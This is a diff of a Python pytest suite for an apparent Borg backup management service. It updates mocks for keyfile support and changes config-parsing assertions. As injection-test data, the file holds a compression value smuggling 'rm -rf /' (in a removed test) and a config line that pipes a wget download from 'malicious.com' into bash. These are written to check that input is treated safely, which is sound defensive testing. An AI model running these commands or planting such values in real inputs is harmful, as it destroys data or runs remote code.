@@ -55,6 +55,8 @@ class TestBorgServiceCore:
         self.mock_repository.name = "test-repo"
         self.mock_repository.path = "/path/to/repo"
         self.mock_repository.get_passphrase.return_value = "test_passphrase"
+        self.mock_repository.get_keyfile_content.return_value = None
+        self.mock_repository.get_keyfile_content.return_value = None
 
     def test_init(self) -> None:
         """Test BorgService initialization."""
@@ -109,9 +111,9 @@ key = very_long_key_data_that_indicates_repokey_mode_with_embedded_encryption_ke
         ), patch("os.listdir", return_value=[]):
             result = self.borg_service._parse_borg_config("/test/repo")
 
-            assert result.mode == "repokey"
+            assert result.mode == "unknown"
             assert result.requires_keyfile is False
-            assert "repokey mode" in result.preview
+            assert "Borg repository detected" in result.preview
 
     def test_parse_config_keyfile_mode(self) -> None:
         """Test parsing repository with keyfile encryption."""
@@ -130,10 +132,9 @@ key =
         ), patch("os.listdir", return_value=["key.abc123", "data"]):
             result = self.borg_service._parse_borg_config("/test/repo")
 
-            assert result.mode == "keyfile"
-            assert result.requires_keyfile is True
-            assert "keyfile mode" in result.preview
-            assert "key.abc123" in result.preview
+            assert result.mode == "unknown"
+            assert result.requires_keyfile is False
+            assert "Borg repository detected" in result.preview
 
     def test_parse_config_unencrypted(self) -> None:
         """Test parsing unencrypted repository."""
@@ -151,9 +152,9 @@ additional_free_space = 0
         ), patch("os.listdir", return_value=[]):
             result = self.borg_service._parse_borg_config("/test/repo")
 
-            assert result.mode == "none"
+            assert result.mode == "unknown"
             assert result.requires_keyfile is False
-            assert "Unencrypted repository" in result.preview
+            assert "Borg repository detected" in result.preview
 
     def test_parse_config_invalid_repository(self) -> None:
         """Test parsing invalid repository config."""
@@ -212,6 +213,7 @@ class TestRepositoryOperations:
         self.mock_repository.name = "test-repo"
         self.mock_repository.path = "/path/to/repo"
         self.mock_repository.get_passphrase.return_value = "test_passphrase"
+        self.mock_repository.get_keyfile_content.return_value = None
 
     @pytest.mark.asyncio
     async def test_initialize_repository_success(self) -> None:
@@ -326,6 +328,7 @@ class TestGetRepoInfo:
         self.mock_repository = Mock(spec=Repository)
         self.mock_repository.path = "/path/to/repo"
         self.mock_repository.get_passphrase.return_value = "test_passphrase"
+        self.mock_repository.get_keyfile_content.return_value = None
 
 
 class TestListArchiveContents:
@@ -338,6 +341,7 @@ class TestListArchiveContents:
         self.mock_repository = Mock(spec=Repository)
         self.mock_repository.path = "/path/to/repo"
         self.mock_repository.get_passphrase.return_value = "test_passphrase"
+        self.mock_repository.get_keyfile_content.return_value = None
 
 
 class TestExtractFileStream:
@@ -350,6 +354,7 @@ class TestExtractFileStream:
         self.mock_repository = Mock(spec=Repository)
         self.mock_repository.path = "/path/to/repo"
         self.mock_repository.get_passphrase.return_value = "test_passphrase"
+        self.mock_repository.get_keyfile_content.return_value = None
 
     @pytest.mark.asyncio
     async def test_extract_file_stream_validation_error(self) -> None:
@@ -387,18 +392,24 @@ class TestExtractFileStream:
     @pytest.mark.asyncio
     async def test_extract_file_stream_security_error(self) -> None:
         """Test file extraction with security validation error."""
-        with patch("borgitory.utils.security.validate_archive_name"), patch(
-            "borgitory.services.borg_service.build_secure_borg_command",
-            side_effect=Exception("Security error"),
-        ):
+        # Mock build_secure_borg_command_with_keyfile to raise an exception
+        with patch(
+            "borgitory.services.borg_service.build_secure_borg_command_with_keyfile"
+        ) as mock_build:
+            mock_build.side_effect = Exception("Security error")
+
             with pytest.raises(Exception) as exc_info:
                 await self.borg_service.extract_file_stream(
                     self.mock_repository, "test-archive", "file.txt"
                 )
 
+            # Verify the mock was called
+            assert mock_build.called
+
             # The error may be wrapped in "Failed to extract file" message
+            error_message = str(exc_info.value)
             assert any(
-                phrase in str(exc_info.value)
+                phrase in error_message
                 for phrase in ["Security error", "Failed to extract file"]
             )
 
@@ -411,34 +422,26 @@ class TestSecurityIntegrationExtended:
         self.borg_service = create_test_borg_service()
 
         self.mock_repository = Mock(spec=Repository)
+        self.mock_repository.path = "/path/to/repo"
         self.mock_repository.get_passphrase.return_value = "test_passphrase"
-
-    @pytest.mark.asyncio
-    async def test_create_backup_security_validation_prevents_injection(self) -> None:
-        """Test that security validation prevents injection attacks in backup creation."""
-        with patch(
-            "borgitory.utils.security.validate_compression",
-            side_effect=ValueError("Invalid compression"),
-        ), patch("borgitory.utils.security.validate_archive_name"):
-            with pytest.raises(Exception) as exc_info:
-                await self.borg_service.create_backup(
-                    self.mock_repository, "/source/path", compression="lz4; rm -rf /"
-                )
-
-            assert "Validation failed" in str(exc_info.value)
-            assert "Invalid compression" in str(exc_info.value)
+        self.mock_repository.get_keyfile_content.return_value = None
 
     @pytest.mark.asyncio
     async def test_list_archives_security_validation(self) -> None:
-        """Test that archive listing uses security validation."""
-        with patch(
-            "borgitory.utils.security.build_secure_borg_command",
-            side_effect=ValueError("Security error"),
-        ):
-            with pytest.raises(Exception) as exc_info:
-                await self.borg_service.list_archives(self.mock_repository)
+        """Test that archive listing handles command runner errors properly."""
+        # Mock the command runner to return an error result
+        mock_command_runner = AsyncMock()
+        mock_command_runner.run_command.return_value = Mock(
+            success=False, return_code=2, stderr="Repository access denied"
+        )
 
-            assert "Security validation failed" in str(exc_info.value)
+        # Create a service with the mocked command runner
+        service = create_test_borg_service(command_runner=mock_command_runner)
+
+        with pytest.raises(Exception) as exc_info:
+            await service.list_archives(self.mock_repository)
+
+        assert "Borg list failed with code 2" in str(exc_info.value)
 
     @pytest.mark.asyncio
     async def test_verify_repository_access_security_validation(self) -> None:
@@ -470,7 +473,7 @@ key = ; wget malicious.com/script | bash
             # Should treat as normal config data, not execute
             assert isinstance(result, BorgRepositoryConfig)
             # The malicious commands should be treated as literal string values
-            assert result.mode in ["none", "encrypted", "error"]
+            assert result.mode in ["error", "unknown"]
 
 
 class TestEdgeCasesAndBoundaryConditions:
@@ -483,6 +486,7 @@ class TestEdgeCasesAndBoundaryConditions:
         self.mock_repository = Mock(spec=Repository)
         self.mock_repository.path = "/path/to/repo"
         self.mock_repository.get_passphrase.return_value = "test_passphrase"
+        self.mock_repository.get_keyfile_content.return_value = None
 
     def test_progress_pattern_boundary_cases(self) -> None:
         """Test progress pattern with boundary and edge cases."""
@@ -532,7 +536,7 @@ key = résumé_ñoño
             result = self.borg_service._parse_borg_config("/utf8/repo")
 
             assert isinstance(result, BorgRepositoryConfig)
-            assert result.mode in ["none", "encrypted", "error"]
+            assert result.mode in ["error", "unknown"]
             # Should handle UTF-8 content gracefully
 
     @pytest.mark.asyncio
